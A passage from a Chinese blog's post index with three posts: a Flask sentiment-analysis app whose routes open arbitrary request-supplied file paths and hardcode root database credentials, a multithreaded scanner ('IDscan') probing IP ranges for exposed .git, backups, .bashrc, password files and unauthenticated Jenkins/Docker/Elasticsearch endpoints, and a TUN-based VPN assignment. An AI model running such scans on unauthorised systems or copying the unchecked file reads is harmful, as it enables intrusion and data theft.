&#x27;#333&#x27; &#125; &#125;, data: res.data, &#125;] &#125;); 评论检测当用户输入检测文本，系统会调用训练好的模型对文本进行情感分析，并将得到的结果写入数据库，之后在页面中显示 python代码 @app.route(&#x27;/data1&#x27;,methods=[&#x27;GET&#x27;]) def data1(): path = str(request.args[&#x27;path&#x27;]) data = [] if(len(path)==0): table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 0, &quot;data&quot;: data&#125; else: with open(path, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = f.readlines() rows = [row for row in reader] for i in rows: result = analyzer.analyze(i) // 调用已经封装好的模型对提交的文本进行检测，返回结果 d = &#123;&quot;content&quot;:i,&quot;result&quot;:result&#125; data.append(d) table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 10, &quot;data&quot;: data&#125; return jsonify(table_result) @app.route(&#x27;/ksh&#x27;,methods=[&#x27;GET&#x27;]) def ksh(): path = str(request.args[&#x27;path&#x27;]) good = 0 bad = 0 if(len(path)==0): table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: 0, &quot;data&quot;: data&#125; else: with open(path, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = f.readlines() rows = [row for row in reader] for i in rows: result = analyzer.analyze(i) if(result == &quot;好评&quot;): good+=1 else: bad+=1 table_result = &#123;&quot;good&quot;: good, &quot;bad&quot;: bad&#125; return jsonify(table_result) js脚本 var insTb = table.render(&#123; elem: &#x27;#tableUser&#x27;, url: &#x27;http://127.0.0.1:5000/data&#x27;, height: &#x27;full-250&#x27;, page: true, toolbar: true, cellMinWidth: 100, cols: [ [&#123; type: &#x27;numbers&#x27;, title: &#x27;#&#x27; &#125;, &#123; field: &#x27;content&#x27;, sort: true, title: &#x27;内容&#x27; &#125;, &#123; field: &#x27;type&#x27;, sort: true, title: &#x27;分类&#x27;, width:200, templet: function(d)&#123; if(d.TYPE == 1)&#123; return &#x27;好评&#x27; &#125;else&#123; return &#x27;差评&#x27; &#125; &#125; &#125; ] ] &#125;); 批量检测批量检测是将多条评论写入txt文件中，实现一次检测多条评论，然后将数据显示在页面中，并呈现可视化结果 @app.route(&#x27;/data&#x27;,methods=[&#x27;GET&#x27;]) def data(): limit = int(request.args[&#x27;limit&#x27;]) page = int(request.args[&#x27;page&#x27;]) page = (page-1)*limit conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() cursor.execute(&quot;select count(*) from `result`&quot;); count = cursor.fetchall() cursor = conn.cursor(cursor=pymysql.cursors.DictCursor) cursor.execute(&quot;select * from `result` limit &quot;+str(page)+&quot;,&quot;+str(limit)); data_dict = [] result = cursor.fetchall() for field in result: data_dict.append(field) table_result = &#123;&quot;code&quot;: 0, &quot;msg&quot;: None, &quot;count&quot;: count[0], &quot;data&quot;: data_dict&#125; cursor.close() conn.close() return jsonify(table_result) js脚本 upload.render(&#123; //允许上传的文件后缀 elem: &#x27;#test_upload&#x27;, url: &#x27;http://127.0.0.1:5000/upload&#x27;, field: &#x27;myfile&#x27;, accept: &#x27;file&#x27;, //普通文件 exts: &#x27;txt&#x27;, //只允许上传txt文件 before: function(obj) &#123; //obj参数包含的信息，跟 choose回调完全一致，可参见上文。 layer.load(); //上传loading &#125;, done: function(res) &#123; layer.closeAll(&#x27;loading&#x27;); layer.msg(&#x27;上传成功&#x27;); console.log(res) path = res.path insTb.reload(&#123; where: &#123; &#x27;path&#x27;: path &#125; &#125;); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;http://127.0.0.1:5000/ksh&#x27;, data: &#123; &#x27;path&#x27;: path &#125;, success: function(result) &#123; var option = &#123; tooltip: &#123; trigger: &#x27;item&#x27;, formatter: &#x27;&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)&#x27; &#125;, legend: &#123; orient: &#x27;vertical&#x27;, left: &#x27;left&#x27;, data: [&#x27;有效评论&#x27;, &#x27;垃圾评论&#x27;] &#125;, series: [&#123; name: &#x27;评论比例&#x27;, type: &#x27;pie&#x27;, radius: &#x27;55%&#x27;, center: [&#x27;50%&#x27;, &#x27;60%&#x27;], data: [&#123; value: result.good, name: &#x27;有效评论&#x27; &#125;, &#123; value: result.bad, name: &#x27;垃圾评论&#x27; &#125; ], emphasis: &#123; itemStyle: &#123; shadowBlur: 10, shadowOffsetX: 0, shadowColor: &#x27;rgba(0, 0, 0, 0.5)&#x27; &#125; &#125; &#125;] &#125;; myCharts.setOption(option) &#125; &#125;); 最后呈现的效果 参考： https://github.com/NTDXYG/ProjectsForChineseGraduates","tags":[{"name":"朴素贝叶斯","slug":"朴素贝叶斯","permalink":"https://sunzhengyu99.github.io/tags/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/"}]},{"title":"IDscan","date":"2021-07-28T07:34:38.000Z","path":"2021/07/28/IDscan/","text":"一个针对URL的简单敏感信息扫描器 此工具可以类似于dirsearch，如果字典足够大，完全可以达到相同的效果 环境 python3 使用的库： threadpool pip install requests threadpool 主要文件 IDscan get_ip_list.py 讲IP段转换成ip列表，再进行扫描 IDscan.py threadpool 使用多线程加快扫描速度 random User-Agent 随机使用代理防止被封 rules.txt 漏洞规则 url_list.txt 将被检测内容填入其中 技术实现该脚本可以实现三种类型的扫描，关键在于网端测试，将网端转换为ip列表，再对每一个ip进行扫描 网段 单个或多个网址 某个网站的特殊端口 探测原理将rule.txt中可能存在泄露的url与待检测的网址拼接后，进行访问，之后查看状态码，若为200则可能存在敏感信息泄露。 def verify(target): headers_list = [ &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0&#x27;, &#x27;Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16&#x27;, &#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1&#x27;, &#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14D27 UCBrowser/11.6.1.1003 Mobile AliApp(TUnionSDK/0.1.20)&#x27;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;, &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;, &quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot; ] headers = &#123; &#x27;User-Agent&#x27;: random.choice(headers_list) &#125; f = open(&#x27;rules.txt&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) txt = f.readlines() for x in txt: u,j,w = x.strip().split(&#x27;|&#x27;) url = target + u try: r = requests.get(url,headers=headers,timeout=3,verify=False) # http html = r.text if r.status_code == 200: if j in html: print(&#x27;Find: &#x27; + url +&#x27; is Leak !!! Leak is &#x27;+ w) else: print(&#x27;Find: &#x27; + url +&#x27; is Exist !!!&#x27;) except Exception as e: pass 网端测试将ip网端转换为ip列表 import os,sys base = [str(x) for x in range(10)] + [ chr(x) for x in range(ord(&#x27;A&#x27;),ord(&#x27;A&#x27;)+6)] #十进制0~255转化为二进制,补0到8位 def dec2bin80(string_num): num = int(string_num) mid = [] while True: if num == 0: break num,rem = divmod(num, 2) mid.append(base[rem]) result = &#x27;&#x27;.join([str(x) for x in mid[::-1]]) length = len(result) if length &lt; 8: result = &#x27;0&#x27; * (8 - length) + result return result #十进制0~255转化为二进制,补0到32位 def dec2bin320(string_num): num = int(string_num) mid = [] while True: if num == 0: break num,rem = divmod(num, 2) mid.append(base[rem]) result = &#x27;&#x27;.join([str(x) for x in mid[::-1]]) length = len(result) if length &lt; 32: result = &#x27;0&#x27; * (32 - length) + result return result #十进制0~255转化为二进制，不补零 def dec2bin(string_num): num = int(string_num) mid = [] while True: if num == 0: break num,rem = divmod(num, 2) mid.append(base[rem]) return &#x27;&#x27;.join([str(x) for x in mid[::-1]]) #二进制转换为十进制 def bin2dec(string_num): return str(int(string_num, 2)) #ip列表生成 def iplist(string_startip,string_endip): #分割IP，然后将其转化为8位的二进制代码 start = string_startip.split(&#x27;.&#x27;) start_a = dec2bin80(start[0]) start_b = dec2bin80(start[1]) start_c = dec2bin80(start[2]) start_d = dec2bin80(start[3]) start_bin = start_a + start_b + start_c + start_d #将二进制代码转化为十进制 start_dec = bin2dec(start_bin) end = string_endip.split(&#x27;.&#x27;) end_a = dec2bin80(end[0]) end_b = dec2bin80(end[1]) end_c = dec2bin80(end[2]) end_d = dec2bin80(end[3]) end_bin = end_a + end_b + end_c + end_d #将二进制代码转化为十进制 end_dec = bin2dec(end_bin) #十进制相减，获取两个IP之间有多少个IP count = int(end_dec) - int(start_dec) ip_list = [] #生成IP列表 for i in range(0,count + 1): #将十进制IP加一，再转化为二进制（32位补齐） plusone_dec = int(start_dec) + i plusone_dec = str(plusone_dec) address_bin = dec2bin320(plusone_dec) #分割IP，转化为十进制 address_a = bin2dec(address_bin[0:8]) address_b = bin2dec(address_bin[8:16]) address_c = bin2dec(address_bin[16:24]) address_d = bin2dec(address_bin[24:32]) address = address_a + &#x27;.&#x27;+ address_b +&#x27;.&#x27;+ address_c +&#x27;.&#x27;+ address_d ip_list.append(address) return ip_list 扫描规则这里定义了一些常见的敏感信息的url，主函数通过一行一行读取该文件中的内容，然后与网址拼接后访问 /.svn/entries|dir|SVN信息泄露 /.git/config|[core]|Git信息泄露 /.git/config|repositoryformatversion|Git信息泄露 .git/refs/stash||git stash 泄露 /CVS/Root||cvs信息泄露 /CVS/Entries||cvs信息泄露 /.hg/||.hg源码泄漏 /.bzr/||.bzr信息泄露 /.DS_Store||DS_Store文件泄露 /htaccess.txt||访问控制文件泄露 /.index.php.swp||vim交换文件名 /.index.php.swn||vim交换文件名 /.index.php.swo||vim交换文件名 /WEB-INF/web.xml|&lt;?xml version=|初始化工程配置信息泄露 /WEB-INF/web.xml|&lt;web-app|初始化工程配置信息泄露 /crossdomin.xml|cross-domain-policy|跨域策略文件 /icons/|Index of|目录遍历路径 /robots.txt|Disallow|爬虫配置文件 /uddiexplorer/SearchPublicRegistries.jsp|Search public registries|Weblogic 服务器请求伪造漏洞 /ws_utc/config.do|tc_container|Oracle WebLogic ws-utc 任意文件上传漏洞 :8080/manage||Jenkins未授权访问可执行命令 :8080/script||Jenkins未授权访问可执行命令 :9200/||build_hashElasticsearch未授权访问 :9200/_cat/indices|_river|Elasticsearch未授权访问 :9200/_river/_search|node|Elasticsearch未授权访问 :5984/_config/|httpd_design_handlers|CouchDB未授权访问 :2375/containers/json|[|Docker未授权访问 :8161/admin/||ActiveMQ未授权访问 :7001/_async/AsyncResponseService||AsyncResponseService RCE /test.php||测试页面 /test.cgi||测试页面 /info.php||测试页面 /login.php||管理后台地址泄露 /admin.php||管理后台地址泄露 /manager.php||管理后台地址泄露 /admin_login.php||管理后台地址泄露 /.test.php.swp||编辑器备份文件泄露 /test.php.bak||编辑器备份文件泄露 /test.jsp.old||编辑器备份文件泄露 /cgi~||编辑器备份文件泄露 /phpmyadmin||phpmyadmin后台泄露 /phpinfo.php||phpinfo页面泄露 /basic/index.php||HTTP认证泄露漏洞 /www.rar||网站备份文件 /web.zip||网站备份文件 /www.zip||网站备份文件 /sitename.tar.gz||网站备份文件 /_vti_inf.html||Frontpage 信息泄漏 /_vti_pvt/service.pwd||FrontPage pwd 文件可读 /.bashrc||bashrc 信息泄漏 /.bash_profile||profile 信息泄露 /.zshrc||zsh 信息泄露 主函数def main(): print(&#x27;*&#x27;*35+&#x27;&#x27;&#x27;\\nIDscan V3.0\\n Information disclosure Check.\\n&#x27;&#x27;&#x27;+&#x27;*&#x27;*35) with open(&#x27;url_list.txt&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as f: url_l = f.readlines() pool = threadpool.ThreadPool(255) ipl = [] for i in url_l: if &#x27;http&#x27; in i: # website url ipl.append(i.strip()) elif &#x27;-&#x27; in i: # network segment start_ip,end_ip = i.split(&#x27;-&#x27;) ipl.extend(get_ip_list.iplist(start_ip,end_ip)) elif checkip(i): ipl.append(i.strip()) else: print(&#x27;Unknown form IP：&#x27;+i) print(&#x27;Start...&#x27;) rethr = threadpool.makeRequests(verify, ipl) # connect rules [pool.putRequest(req) for req in rethr] pool.wait() print(&#x27;End...&#x27;) url_list.txt 使用方法 如果你想扫描网段 192.168.0.0-192.168.0.255 192.167.36.24-192.168.39.255 if you want to scan special port | 如果你想扫描特殊端口 192.168.0.1:8081 if you wang to scan website url| 如果你想扫描网站地址 http://www.baidu.com https://www.baidu.com http://www.baidu.com:81 扫描百度的结果 参考: https://github.com/zhaijiahui/IDscan","tags":[{"name":"scan","slug":"scan","permalink":"https://sunzhengyu99.github.io/tags/scan/"}]},{"title":"VPN","date":"2021-07-21T08:04:57.000Z","path":"2021/07/21/VPN/","text":"操作系统大作业 一、基于UDP/TCP的VPN实现原理 tun 接口 VPN搭建 隧道转发数据包 tun 设备简介tun(/tap) 是 Linux 内核 2.4.x 版本之后实现的虚拟网络设备，不同于物理网卡靠硬件网卡实现，tap/tun 虚拟网卡完全由软件来实现，功能和硬件实现完全没有差别，它们都属于网络设备，都可以配置 IP，都归 Linux 网络设备管理模块统一管理。 TUN 工作机制TUN 设备是一种虚拟网络设备，通过此设备，程序可以方便得模拟网络行为。其工作方式如图 Linux Tun/Tap驱动程序为应用程序提供了两种交互方式：虚拟网络接口和字符设备/dev/net/tun。写入字符设备/dev/net/tun的数据会发送到虚拟网络接口中；发送到虚拟网络接口中的数据也会出现在该字符设备上。 应用程序可以通过标准的Socket API向Tun/Tap接口发送IP数据包，就好像对一个真实的网卡进行操作一样。除了应用程序以外，操作系统也会根据TCP/IP协议栈的处理向Tun/Tap接口发送IP数据包或者以太网数据包，例如ARP或者ICMP数据包。Tun/Tap驱动程序会将Tun/Tap接口收到的数据包原样写入到/dev/net/tun字符设备上，处理Tun/Tap数据的应用程序如VPN程序可以从该设备上读取到数据包，以进行相应处理。 应用程序也可以通过/dev/net/tun字符设备写入数据包，这种情况下该字符设备上写入的数据包会被发送到Tun/Tap虚拟接口上，进入操作系统的TCP/IP协议栈进行相应处理，就像从物理网卡进入操作系统的数据一样。 搭建 VPN其工作流程为： 通过程序可以从/dev/net/tun字符设备中读取(read)或者写入(write)数据，再通过将Tun结合物理网络设备使用,我们可以创建一个点对点的隧道。如下图所示，左边主机上应用程序发送到Tun虚拟设备上的IP数据包被VPN程序通过字符设备接收，然后再通过一个UDP隧道发送到右端的VPN服务器上，VPN服务器将隧道负载中的原始IP数据包写入字符设备，这些IP包就会出现在右侧的Tun虚拟设备上，最后通过操作系统协议栈和socket接口发送到右侧的应用程序上。 通过隧道发送/接收包 当隧道建立后，如何通过隧道发送/接收数据包是需要解决的问题 通过隧道发送 通过TUN接口获得一个IP包—&gt;加密（或者验证)—&gt;把它作为载荷发送到隧道另一端 通过隧道接收 通过隧道接收载荷—&gt;解密并验证数据—&gt;获得真实的包数据—&gt;把包数据写到TUN接口。 如下图所示 监听socket和tun0网卡，然后转发数据包 每一个隧道应用都有两种接口: socket接口、TUN接口，两种接口都需要监听，需要在两种接口间转发数据。 程序实现在编写程序之前需要做一些准备，程序流程图如下 从图中可知程序中主要包含四个部分 创建tun0网卡 客户端和服务器socket连接 转发来自tunnel和tun0数据 主程序，监听接口阻塞进程 vpnclient 和 vpnserver 程序是 VPN 隧道的两端。它们通过套接字使用 UDP 相互通信。客户端和服务器之间的虚线描绘了 VPN 隧道的路径。 VPN 客户端和服务器程序通过 TUN 接口连接到主机系统，通过它他们做两件事： （1）从主机系统获取 IP 数据包，因此数据包可以通过隧道发送 （2）从隧道获取 IP 数据包，然后将其转发到托管系统，该系统会将数据包转发到其最终目的地。 创建tun网卡在上图中可以看到客户端和服务器都需要一个tun网卡，所以需要在两台主机上都创建一个tun0网卡，从而形成tunnel，实现通信 使用命令创建tun网卡 ip tuntap add dev tun0 mode tun 当上面的命令执行完再使用ifconfig -a就可以看到刚刚创建的tun0网卡，再使用如下的命令对其配置 ifconfig tun0 192.168.53.5/24 up 但是这里为了程序执行方便，直接在程序中创建虚拟网卡 int createTunDevice() &#123; // 创建 tun0 网卡 int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tun设备不包含以太网头部 tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // 打开文件 ioctl(tunfd, TUNSETIFF, &amp;ifr); // 打开设备 return tunfd; // 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启 &#125; socket连接VPN server UDP连接int initUDPServer() &#123; int sockfd; struct sockaddr_in server; char buff[100]; memset(&amp;server, 0, sizeof(server)); server.sin_family = AF_INET; // 服务器地址类型为IPV4 server.sin_addr.s_addr = htonl(INADDR_ANY); //服务器IP server.sin_port = htons(PORT_NUMBER); // 端口号 sockfd = socket(AF_INET, SOCK_DGRAM, 0); //创建UDP的套接字 bind(sockfd, (struct sockaddr*) &amp;server, sizeof(server)); // socket绑定地址和端口 // 等待连接 bzero(buff, 100); //清空缓冲区 int peerAddrLen = sizeof(struct sockaddr_in); //初始化结构体 int len = recvfrom(sockfd, buff, 100, 0,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen); // 等待接收数据 printf(&quot;Connected with the client: %s\\n&quot;, buff); return sockfd; &#125; VPN client int connectToUDPServer()&#123; //创建socket连接 连接到vpn服务器 int sockfd; char *hello=&quot;Hello&quot;; //指定服务器的地址结构 memset(&amp;peerAddr, 0, sizeof(peerAddr)); peerAddr.sin_family = AF_INET; // 服务器地址类型为IPV4 peerAddr.sin_port = htons(PORT_NUMBER); peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP); sockfd = socket(AF_INET, SOCK_DGRAM, 0); sendto(sockfd, hello, strlen(hello), 0, // 连接服务器后发送一个消息 hello (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); return sockfd; &#125; TCP连接VPN server int initTCPServer() &#123; struct sockaddr_in sa_server; int listen_sock; listen_sock= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); CHK_ERR(listen_sock, &quot;socket&quot;); memset (&amp;sa_server, &#x27;\\0&#x27;, sizeof(sa_server)); sa_server.sin_family = AF_INET; sa_server.sin_addr.s_addr = INADDR_ANY; sa_server.sin_port = htons (4433); int err = bind(listen_sock, (struct sockaddr*)&amp;sa_server, sizeof(sa_server)); CHK_ERR(err, &quot;bind&quot;); err = listen(listen_sock, 5); CHK_ERR(err, &quot;listen&quot;); return listen_sock; &#125; VPN client int initTCPClient(const char* hostname, int port) &#123; struct sockaddr_in server_addr; struct hostent* hp = gethostbyname(hostname); // 创建TCP socket int sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 填写ip 端口 和协议信息 memset (&amp;server_addr, &#x27;\\0&#x27;, sizeof(server_addr)); memcpy(&amp;(server_addr.sin_addr.s_addr), hp-&gt;h_addr, hp-&gt;h_length); server_addr.sin_port = htons (port); server_addr.sin_family = AF_INET; // 连接目的地址 connect(sockfd, (struct sockaddr*) &amp;server_addr, sizeof(server_addr)); return sockfd; &#125; 转发端口数据客户端程序和服务器端程序都需要以下两个库函数 int sendto(int s, const void * msg, int len, unsigned int flags, const struct sockaddr * to, int tolen); 函数说明：sendto() 用来将数据由指定的socket 传给对方主机. 参数s 为已建好连线的socket, 如果利用UDP协议则不需经过连线操作. 参数msg 指向欲连线的数据内容, 参数flags 一般设0, 参数to 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数tolen 为sockaddr 的结果长度. int recvfrom(int s, void *buf, int len, unsigned int flags, struct sockaddr *from,int *fromlen); 函数说明：recv()用来接收远程主机经指定的socket 传来的数据, 并把数据存到由参数buf 指向的内存空间, 参数len 为可接收数据的最大长度. 参数flags 一般设0, 参数from 用来指定欲传送的网络地址, 结构sockaddr 请参考bind(). 参数fromlen 为sockaddr 的结构长度. 从tun0接收数据转发到tunnel void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //定义接收数的缓冲区 printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // 清空缓冲区 len = read(tunfd, buff, BUFF_SIZE); // 读取来自tun0网卡的数据，保存在缓冲区中 sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // 通过socket发送数据 &#125; 从tunnel接收数据转发到tun0 void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // 接收数据至buff，保存数据的长度 write(tunfd, buff, len); // 通过write发送到tun0 &#125; 主函数主要作用，调用之前的函数，创建tun0网卡；建立基于udp的socket连接；循环接收数据 用到的库函数 int select(int n, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, struct timeval * timeout); 函数说明：select()用来等待文件描述词状态的改变，会阻塞进程. 参数n 代表最大的文件描述词加1, 参数readfds、writefds 和exceptfds 称为描述词组, 是用来回传该描述词的读, 写或例外的状况. 底下的宏提供了处理这三种描述词组的方式： FD_CLR(inr fd, fd_set* set); 用来清除描述词组set 中相关fd 的位 FD_ISSET(int fd, fd_set * set); 用来测试描述词组set 中相关fd 的位是否为真 FD_SET(int fd, fd_set* set); 用来设置描述词组set 中相关fd 的位 FD_ZERO(fd_set * set); 用来清除描述词组set 的全部位 FD_ISSET 检测fd在fdset集合中的状态是否变化，当检测到fd状态发生变化时返回真，否则，返回假（也可以认为集合中指定的文件描述符是否可以读写）。 fd_set 可以理解为一个集合，这个集合中存放的是文件描述符(file descriptor)，即文件句柄，它用一位来表示一个fd（下面会仔细介绍） int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // 创建tun0网卡 sockfd = connectToUDPServer(); // 建立socket连接 // 进入主循环 while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // 将set清零使集合中不含任何fd FD_SET(sockfd, &amp;readFDSet); // 将socketfd加入set集合 FD_SET(tunfd, &amp;readFDSet); // 将tunfd加入set集合 select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // 监听两个端口 阻塞进程，知道有一个端口收到数据 // 当收到数据程序继续执行 对数据进行转发 if (FD_ISSET(tunfd, &amp;readFDSet)) // 当tun的文件fd可以读写 tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // 当socket的文件fd可以读写 socketSelected(tunfd, sockfd); &#125; &#125; 完整代码VPN server #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;linux/if.h&gt; #include &lt;linux/if_tun.h&gt; #include &lt;sys/ioctl.h&gt; #define PORT_NUMBER 55555 #define BUFF_SIZE 2000 struct sockaddr_in peerAddr; int createTunDevice() &#123; // 创建 tun0 网卡 int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tun设备不包含以太网头部 tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // 打开文件 ioctl(tunfd, TUNSETIFF, &amp;ifr); // 打开设备 return tunfd; // 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启 &#125; int initUDPServer() &#123; int sockfd; struct sockaddr_in server; char buff[100]; memset(&amp;server, 0, sizeof(server)); server.sin_family = AF_INET; // 服务器地址类型为IPV4 server.sin_addr.s_addr = htonl(INADDR_ANY); //服务器IP server.sin_port = htons(PORT_NUMBER); // 端口号 sockfd = socket(AF_INET, SOCK_DGRAM, 0); //创建UDP的套接字 bind(sockfd, (struct sockaddr*) &amp;server, sizeof(server)); // socket绑定地址和端口 // 等待连接 bzero(buff, 100); //清空缓冲区 int peerAddrLen = sizeof(struct sockaddr_in); //初始化结构体 int len = recvfrom(sockfd, buff, 100, 0,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen); // 等待接收数据 printf(&quot;Connected with the client: %s\\n&quot;, buff); return sockfd; &#125; void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //定义接收数的缓冲区 printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // 清空缓冲区 len = read(tunfd, buff, BUFF_SIZE); // 读取来自tun0网卡的数据，保存在缓冲区中 sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // 通过socket发送数据 &#125; void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // 接收数据至buff，保存数据的长度 write(tunfd, buff, len); // 通过write发送到tun0 &#125; int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // 创建tun0网卡 sockfd = connectToUDPServer(); // 建立socket连接 // 进入主循环 while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // 将set清零使集合中不含任何fd FD_SET(sockfd, &amp;readFDSet); // 将socketfd加入set集合 FD_SET(tunfd, &amp;readFDSet); // 将tunfd加入set集合 select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // 监听两个端口 阻塞进程，知道有一个端口收到数据 // 当收到数据程序继续执行 对数据进行转发 if (FD_ISSET(tunfd, &amp;readFDSet)) // 当tun的文件fd可以读写 tunSelected(tunfd, sockfd); if (FD_ISSET(sockfd, &amp;readFDSet)) // 当socket的文件fd可以读写 socketSelected(tunfd, sockfd); &#125; &#125; VPN client #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;linux/if.h&gt; #include &lt;linux/if_tun.h&gt; #include &lt;sys/ioctl.h&gt; #define BUFF_SIZE 2000 #define PORT_NUMBER 55555 #define SERVER_IP &quot;10.0.2.8&quot; // VPN 服务器ip struct sockaddr_in peerAddr; int createTunDevice() &#123; // 创建 tun0 网卡 int tunfd; struct ifreq ifr; memset(&amp;ifr, 0, sizeof(ifr)); ifr.ifr_flags = IFF_TUN | IFF_NO_PI; // tun设备不包含以太网头部 tunfd = open(&quot;/dev/net/tun&quot;, O_RDWR); // 打开文件 ioctl(tunfd, TUNSETIFF, &amp;ifr); // 打开设备 return tunfd; // 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启 &#125; int connectToUDPServer()&#123; //创建socket连接 连接到vpn服务器 int sockfd; char *hello=&quot;Hello&quot;; //指定服务器的地址结构 memset(&amp;peerAddr, 0, sizeof(peerAddr)); peerAddr.sin_family = AF_INET; // 服务器地址类型为IPV4 peerAddr.sin_port = htons(PORT_NUMBER); peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP); sockfd = socket(AF_INET, SOCK_DGRAM, 0); sendto(sockfd, hello, strlen(hello), 0, // 连接服务器后发送一个消息 hello (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); return sockfd; &#125; void tunSelected(int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; //定义接收数的缓冲区 printf(&quot;Got a packet from TUN\\n&quot;); bzero(buff, BUFF_SIZE); // 清空缓冲区 len = read(tunfd, buff, BUFF_SIZE); // 读取来自tun0网卡的数据，保存在缓冲区中 sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr, sizeof(peerAddr)); // 通过socket发送数据 &#125; void socketSelected (int tunfd, int sockfd)&#123; int len; char buff[BUFF_SIZE]; printf(&quot;Got a packet from the tunnel\\n&quot;); bzero(buff, BUFF_SIZE); len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL); // 接收数据至buff，保存数据的长度 write(tunfd, buff, len); // 通过write发送到tun0 &#125; int main (int argc, char * argv[]) &#123; int tunfd, sockfd; tunfd = createTunDevice(); // 创建tun0网卡 sockfd = connectToUDPServer(); // 建立socket连接 // 进入主循环 while (1) &#123; fd_set readFDSet; FD_ZERO(&amp;readFDSet); // 将set清零使集合中不含任何fd FD_SET(sockfd, &amp;readFDSet); // 将socketfd加入set集合 FD_SET(tunfd, &amp;readFDSet); // 将tunfd加入set集合 select(FD_SETSIZE, &amp;readFDSet, NULL, NULL, NULL); // 监听两个端口 阻塞进程，知道有一个端口收到数据 // 当收到数据程序继续执行 对数据进行转发 if (FD_ISSET(tunfd, 